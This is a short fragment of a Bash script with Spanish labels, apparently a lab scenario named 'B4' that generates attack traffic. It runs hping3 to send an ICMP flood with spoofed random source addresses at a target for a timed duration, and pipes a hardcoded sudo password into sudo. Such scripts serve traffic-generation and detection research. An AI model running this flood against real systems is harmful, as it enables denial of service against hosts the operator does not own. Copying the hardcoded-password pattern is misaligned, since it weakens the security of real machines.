...
HORA_INICIO="$(date +%T)"
echo "Iniciando B4 ICMP flood → ${DESTINO} por ${DURACION_SEGUNDOS}s"

echo cisco123 | sudo -S timeout "$DURACION_SEGUNDOS" \
  hping3 -1 -i u5000 --rand-source "$DESTINO" 2>/dev/null || true
...
echo "B4 completado | Inicio: $HORA_INICIO | Fin: $HORA_FIN | Archivo: $ARCHIVO_SALIDA"
